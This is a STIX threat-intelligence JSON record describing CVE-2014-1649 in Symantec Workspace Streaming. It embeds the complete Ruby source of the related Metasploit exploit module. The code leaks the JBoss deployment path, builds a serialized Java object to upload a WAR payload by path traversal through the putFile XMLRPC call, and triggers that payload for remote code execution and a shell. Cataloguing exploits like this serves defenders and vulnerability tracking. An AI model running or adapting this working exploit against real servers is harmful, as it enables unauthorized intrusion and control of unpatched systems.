{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e6861959-0543-41f2-b8f0-0c3e9682bf6d",
    "created": "2024-08-14T16:51:40.446316Z",
    "modified": "2024-08-14T16:51:40.44632Z",
    "name": "Symantec Workspace Streaming ManagementAgentServer.putFile XMLRPC Request Arbitrary File Upload",
    "description": " This module exploits a code execution flaw in Symantec Workspace Streaming. The vulnerability exists in the ManagementAgentServer.putFile XMLRPC call exposed by the as_agent.exe service, which allows for uploading arbitrary files under the server root. This module abuses the auto deploy feature in the JBoss as_ste.exe instance in order to achieve remote code execution. This module has been tested successfully on Symantec Workspace Streaming 6.1 SP8 and Windows 2003 SP2, and reported to affect 7.5.0.x. Abused services listen on a single-machine deployment and also in the backend role in a multiple-machine deployment. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/antivirus/symantec_workspace_streaming_exec.rb",
            "external_id": "symantec_workspace_streaming_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-1649"
        },
        {
            "source_name": "reference",
            "url": "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20140512_00"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Symantec Workspace Streaming ManagementAgentServer.putFile XMLRPC Request Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits a code execution flaw in Symantec Workspace Streaming. The\n        vulnerability exists in the ManagementAgentServer.putFile XMLRPC call exposed by the\n        as_agent.exe service, which allows for uploading arbitrary files under the server root.\n        This module abuses the auto deploy feature in the JBoss as_ste.exe instance in order\n        to achieve remote code execution. This module has been tested successfully on Symantec\n        Workspace Streaming 6.1 SP8 and Windows 2003 SP2, and reported to affect 7.5.0.x.\n        Abused services listen on a single-machine deployment and also in the backend role in\n        a multiple-machine deployment.\n      },\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2014-1649'],\n          ['OSVDB', '106923'],\n          ['BID', '67189'],\n          ['ZDI', '14-127'],\n          ['URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20140512_00']\n        ],\n      'Privileged'  => true,\n      'Platform'    => 'java',\n      'Arch' => ARCH_JAVA,\n      'Targets'     =>\n        [\n          [ 'Symantec Workspace Streaming 6.1 SP8 / Java Universal', {} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-05-12'))\n\n    register_options(\n      [\n        Opt::RPORT(9855), # as_agent.exe (afuse XMLRPC to upload arbitrary file)\n        OptPort.new('STE_PORT', [true, \"The remote as_ste.exe AS server port\", 9832]), # as_ste.exe (abuse JBoss auto deploy)\n      ])\n  end\n\n  def send_xml_rpc_request(xml)\n    res = send_request_cgi(\n      {\n        'uri'     => normalize_uri(\"/\", \"xmlrpc\"),\n        'method'  => 'POST',\n        'ctype'   => 'text/xml; charset=UTF-8',\n        'data'    => xml\n      })\n\n    res\n  end\n\n  def build_soap_get_file(file_path)\n    xml = Document.new\n    xml.add_element(\n        \"methodCall\",\n        {\n            'xmlns:ex' => \"http://ws.apache.org/xmlrpc/namespaces/extensions\"\n        })\n    method_name = xml.root.add_element(\"methodName\")\n    method_name.text = \"ManagementAgentServer.getFile\"\n\n    params = xml.root.add_element(\"params\")\n\n    param_server_root = params.add_element(\"param\")\n    value_server_root = param_server_root.add_element(\"value\")\n    value_server_root.text = \"*AWESE\"\n\n    param_file_type = params.add_element(\"param\")\n    value_file_type = param_file_type.add_element(\"value\")\n    type_file_type = value_file_type.add_element(\"i4\")\n    type_file_type.text = \"0\" # build path from the server root directory\n\n    param_file_name = params.add_element(\"param\")\n    value_file_name = param_file_name.add_element(\"value\")\n    value_file_name.text = file_path\n\n    param_file_binary = params.add_element(\"param\")\n    value_file_binary = param_file_binary.add_element(\"value\")\n    type_file_binary = value_file_binary.add_element(\"boolean\")\n    type_file_binary.text = \"0\"\n\n    xml << XMLDecl.new(\"1.0\", \"UTF-8\")\n\n    xml.to_s\n  end\n\n  def build_soap_put_file(file)\n    xml = Document.new\n    xml.add_element(\n        \"methodCall\",\n        {\n            'xmlns:ex' => \"http://ws.apache.org/xmlrpc/namespaces/extensions\"\n        })\n    method_name = xml.root.add_element(\"methodName\")\n    method_name.text = \"ManagementAgentServer.putFile\"\n\n    params = xml.root.add_element(\"params\")\n\n    param_server_root = params.add_element(\"param\")\n    value_server_root = param_server_root.add_element(\"value\")\n    value_server_root.text = \"*AWESE\"\n\n    param_file_type = params.add_element(\"param\")\n    value_file_type = param_file_type.add_element(\"value\")\n    type_file_type = value_file_type.add_element(\"i4\")\n    type_file_type.text = \"0\" # build path from the server root directory\n\n    param_file = params.add_element(\"param\")\n    value_file = param_file.add_element(\"value\")\n    type_value_file = value_file.add_element(\"ex:serializable\")\n    type_value_file.text = file\n\n    xml << XMLDecl.new(\"1.0\", \"UTF-8\")\n\n    xml.to_s\n  end\n\n  def build_soap_check_put\n    xml = Document.new\n    xml.add_element(\n        \"methodCall\",\n        {\n            'xmlns:ex' => \"http://ws.apache.org/xmlrpc/namespaces/extensions\"\n        })\n    method_name = xml.root.add_element(\"methodName\")\n    method_name.text = \"ManagementAgentServer.putFile\"\n    xml.root.add_element(\"params\")\n    xml << XMLDecl.new(\"1.0\", \"UTF-8\")\n    xml.to_s\n  end\n\n  def parse_method_response(xml)\n    doc = Document.new(xml)\n    file = XPath.first(doc, \"methodResponse/params/param/value/ex:serializable\")\n\n    unless file.nil?\n      file = Rex::Text.decode_base64(file.text)\n    end\n\n    file\n  end\n\n  def get_file(path)\n    xml_call = build_soap_get_file(path)\n    file = nil\n\n    res = send_xml_rpc_request(xml_call)\n\n    if res && res.code == 200 && res.body\n      file = parse_method_response(res.body.to_s)\n    end\n\n    file\n  end\n\n  def put_file(file)\n    result = nil\n    xml_call = build_soap_put_file(file)\n\n    res = send_xml_rpc_request(xml_call)\n\n    if res && res.code == 200 && res.body\n      result = parse_method_response(res.body.to_s)\n    end\n\n    result\n  end\n\n  def upload_war(war_name, war, dst)\n    result = false\n    java_file = build_java_file_info(\"#{dst}#{war_name}\", war)\n    java_file = Rex::Text.encode_base64(java_file)\n\n    res = put_file(java_file)\n\n    if res && res =~ /ReturnObject.*StatusMessage.*Boolean/\n      result = true\n    end\n\n    result\n  end\n\n  def jboss_deploy_path\n    path = nil\n    leak = get_file(\"bin/CreateDatabaseSchema.cmd\")\n\n    if leak && leak =~ /\\[INSTALLDIR\\](.*)ste\\/ste.jar/\n      path = $1\n    end\n\n    path\n  end\n\n  def check\n    check_result = Exploit::CheckCode::Safe\n\n    if jboss_deploy_path.nil?\n      xml = build_soap_check_put\n      res = send_xml_rpc_request(xml)\n\n      if res && res.code == 200 && res.body && res.body.to_s =~ /No method matching arguments/\n        check_result =  Exploit::CheckCode::Detected\n      end\n    else\n      check_result =  Exploit::CheckCode::Appears\n    end\n\n    check_result\n  end\n\n  def exploit\n    print_status(\"Leaking the JBoss deployment directory...\")\n    jboss_path =jboss_deploy_path\n\n    if jboss_path.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Failed to disclose the JBoss deployment directory\")\n    end\n\n    print_status(\"Building WAR payload...\")\n\n    app_name = Rex::Text.rand_text_alpha(4 + rand(4))\n    war_name = \"#{app_name}.war\"\n    war = payload.encoded_war({ :app_name => app_name }).to_s\n    deploy_dir = \"..#{jboss_path}\"\n\n    print_status(\"Uploading WAR payload...\")\n\n    res = upload_war(war_name, war, deploy_dir)\n\n    unless res\n      fail_with(Failure::Unknown, \"#{peer} - Failed to upload the war payload\")\n    end\n\n    register_files_for_cleanup(\"../server/appstream/deploy/#{war_name}\")\n\n    10.times do\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"#{rhost}:#{ste_port} - Attempting to launch payload in deployed WAR...\")\n      res = send_request_cgi(\n        {\n          'uri'    => normalize_uri(\"/\", app_name, Rex::Text.rand_text_alpha(rand(8)+8)),\n          'method' => 'GET',\n          'rport'  => ste_port # Auto Deploy can be reached through the \"as_ste.exe\" service\n        })\n      # Failure. The request timed out or the server went away.\n      break if res.nil?\n      # Success! Triggered the payload, should have a shell incoming\n      break if res.code == 200\n    end\n\n  end\n\n  def ste_port\n    datastore['STE_PORT']\n  end\n\n  # com.appstream.cm.general.FileInfo serialized object\n  def build_java_file_info(file_name, contents)\n    stream =  \"\\xac\\xed\" # stream magic\n    stream << \"\\x00\\x05\" # stream version\n    stream << \"\\x73\" # new Object\n\n    stream << \"\\x72\" # TC_CLASSDESC\n    stream << [\"com.appstream.cm.general.FileInfo\".length].pack(\"n\")\n    stream << \"com.appstream.cm.general.FileInfo\"\n    stream << \"\\xa3\\x02\\xb6\\x1e\\xa1\\x6b\\xf0\\xa7\" # class serial version identifier\n    stream << \"\\x02\" # flags SC_SERIALIZABLE\n    stream << [6].pack(\"n\") # number of fields in the class\n\n    stream << \"Z\" # boolean\n    stream << [\"bLastPage\".length].pack(\"n\")\n    stream << \"bLastPage\"\n\n    stream << \"J\" # long\n    stream << [\"lFileSize\".length].pack(\"n\")\n    stream << \"lFileSize\"\n\n    stream << \"[\" # array\n    stream << [\"baContent\".length].pack(\"n\")\n    stream << \"baContent\"\n    stream << \"\\x74\" # TC_STRING\n    stream << [\"[B\".length].pack(\"n\")\n    stream << \"[B\" # field's type (byte array)\n\n    stream << \"L\" # Object\n    stream << [\"dTimeStamp\".length].pack(\"n\")\n    stream << \"dTimeStamp\"\n    stream << \"\\x74\" # TC_STRING\n    stream << [\"Ljava/util/Date;\".length].pack(\"n\")\n    stream << \"Ljava/util/Date;\" #field's type (Date)\n\n    stream << \"L\" # Object\n    stream << [\"sContent\".length].pack(\"n\")\n    stream << \"sContent\"\n    stream << \"\\x74\" # TC_STRING\n    stream << [\"Ljava/lang/String;\".length].pack(\"n\")\n    stream << \"Ljava/lang/String;\" #field's type (String)\n\n    stream << \"L\" # Object\n    stream << [\"sFileName\".length].pack(\"n\")\n    stream << \"sFileName\"\n    stream << \"\\x71\" # TC_REFERENCE\n    stream << [0x007e0003].pack(\"N\") # handle\n\n    stream << \"\\x78\" # TC_ENDBLOCKDATA\n    stream << \"\\x70\" # TC_NULL\n\n    # Values\n    stream << [1].pack(\"c\") # bLastPage\n\n    stream << [0xffffffff, 0xffffffff].pack(\"NN\") # lFileSize\n\n    stream << \"\\x75\" # TC_ARRAY\n    stream << \"\\x72\" # TC_CLASSDESC\n    stream << [\"[B\".length].pack(\"n\")\n    stream << \"[B\" # byte array)\n    stream << \"\\xac\\xf3\\x17\\xf8\\x06\\x08\\x54\\xe0\" # class serial version identifier\n    stream << \"\\x02\" # flags SC_SERIALIZABLE\n    stream << [0].pack(\"n\") # number of fields in the class\n    stream << \"\\x78\" # TC_ENDBLOCKDATA\n    stream << \"\\x70\" # TC_NULL\n    stream << [contents.length].pack(\"N\")\n    stream << contents # baContent\n\n    stream << \"\\x70\" # TC_NULL # dTimeStamp\n\n    stream << \"\\x70\" # TC_NULL # sContent\n\n    stream << \"\\x74\" # TC_STRING\n    stream << [file_name.length].pack(\"n\")\n    stream << file_name # sFileName\n\n    stream\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-05-12",
    "x_mitre_platforms": [
        "java'"
    ]
}